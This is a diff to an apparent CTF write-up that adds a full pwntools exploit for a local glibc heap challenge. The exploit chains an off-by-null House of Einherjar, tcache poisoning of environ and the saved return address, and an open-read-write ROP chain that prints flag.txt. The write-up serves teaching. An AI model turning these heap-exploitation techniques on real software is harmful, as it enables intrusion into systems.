@@ -193,6 +193,153 @@ Execution returns into the ROP chain. The flag is printed.
 
 ---
 
+## Full Exploit
+
+```py
+from pwn import *
+import sys
+
+fileName = './chall_patched'
+e = ELF(fileName)
+libc = e.libc
+context.arch = 'amd64'
+p = process(fileName)
+
+# -----------------
+# Helpers
+# -----------------
+
+def malloc(index, size, data):
+    p.sendlineafter("> ", "1")
+    p.sendlineafter("Index: ", str(index))
+    p.sendlineafter("Size: ", str(size))
+    p.sendafter("Data: ", data)
+
+def free(idx):
+    p.sendlineafter("> ", "2")
+    p.sendlineafter("Index: ", str(idx))
+
+def read_note(idx):
+    p.sendlineafter("> ", "3")
+    p.sendlineafter("Index: ", str(idx))
+
+def edit(index, data):
+    p.sendlineafter("> ", "4")
+    p.sendlineafter("Index: ", str(index))
+    p.sendafter("Data: ", data)
+
+# -----------------
+# Stage 1 — Leak heap & libc
+# -----------------
+
+malloc(2, 1280, b'A'*8)
+read_note(2)
+
+leak = p.recv()
+heap_leak = u64(leak[22:30].ljust(8, b'\x00'))
+heap_base = heap_leak - 0x22b0
+
+libc_leak = u64(leak[358:366].ljust(8, b'\x00'))
+libc.address = libc_leak - 0x1e7b20
+
+log.success(f"heap base  = {hex(heap_base)}")
+log.success(f"libc base  = {hex(libc.address)}")
+
+# -----------------
+# Stage 2 — House of Einherjar
+# -----------------
+
+malloc(4, 0xf8, b'A')
+malloc(5, 0xf8, b'B')
+malloc(6, 0xf8, b'C')
+
+payload  = p64(heap_base + 0x2de0)
+payload += p64(heap_base + 0x2de0)
+payload += b'a' * (0xf0 - 16)
+payload += p64(0x100)
+
+edit(5, payload)      # off-by-null clears PREV_INUSE of chunk 6
+free(6)               # backward consolidation → overlap created
+
+# -----------------
+# Stage 3 — Tcache poison → environ
+# -----------------
+
+mang = (heap_base+0x27d0 >> 12) ^ (libc.sym.environ - 24)
+edit(5, p64(mang))
+
+malloc(11, 0x1f8, b'D'*8)
+malloc(10, 0x1f8, b'E'*8)   # returns chunk overlapping environ
+
+# -----------------
+# Stage 4 — Leak stack
+# -----------------
+
+read_note(10)
+leak = p.recv()
+stack_leak = u64(leak[30:38].ljust(8, b'\x00'))
+rsp = stack_leak - 336
+
+log.success(f"stack leak = {hex(stack_leak)}")
+log.success(f"saved RIP  = {hex(rsp)}")
+
+# -----------------
+# Stage 5 — Tcache poison → saved RIP
+# -----------------
+
+free(11)
+
+mang = (heap_base+0x27d0 >> 12) ^ (rsp - 8)
+edit(5, p64(mang))
+
+malloc(11, 0x1f8, b'F'*8)
+
+# -----------------
+# Stage 6 — ORW ROP
+# -----------------
+
+pop_rax = libc.address + 0x00000000000d4f97
+pop_rdi = libc.address + 0x0000000000102dea
+pop_rsi = libc.address + 0x0000000000053847
+mov_rdx_rax = libc.address + 0x00000000001284c7
+syscall = libc.address + 0x0000000000093a56
+
+SYS_READ  = 0
+SYS_WRITE = 1
+SYS_OPEN  = 2
+SYS_EXIT  = 60
+
+def rop_syscall(rax, rdi, rsi, rdx):
+    rop  = p64(pop_rax) + p64(rdx)
+    rop += p64(mov_rdx_rax)
+    rop += p64(pop_rax) + p64(rax)
+    rop += p64(pop_rdi) + p64(rdi)
+    rop += p64(pop_rsi) + p64(rsi)
+    rop += p64(syscall)
+    return rop
+
+DATA_ADDR = heap_base + 0x4500
+
+def build_orw():
+    rop  = b''
+    rop += rop_syscall(SYS_READ, 0, DATA_ADDR, 0x100)
+    rop += rop_syscall(SYS_OPEN, DATA_ADDR, 0, 0)
+    rop += rop_syscall(SYS_READ, 3, DATA_ADDR, 0x100)
+    rop += rop_syscall(SYS_WRITE, 1, DATA_ADDR, 0x400)
+    rop += rop_syscall(SYS_EXIT, 0, 0, 0)
+    return rop
+
+payload  = p64(0)
+payload += build_orw()
+
+malloc(14, 0x1f8, payload)
+
+# send filename
+p.send(b'flag.txt\x00'.ljust(0x100, b'\x00'))
+
+p.interactive()
+```
+
 ## Conclusion 🏆
 
 This challenge removes UAF completely. Exploitation relies on a single null byte that clears PREV_INUSE. That bit flips allocator behavior. Backward consolidation creates overlapping chunks. Overlap enables tcache poisoning. Poisoning yields stack control. Stack control gives ORW execution. No classic overflow. No double free. Just one precise byte and deep understanding of glibc internals.
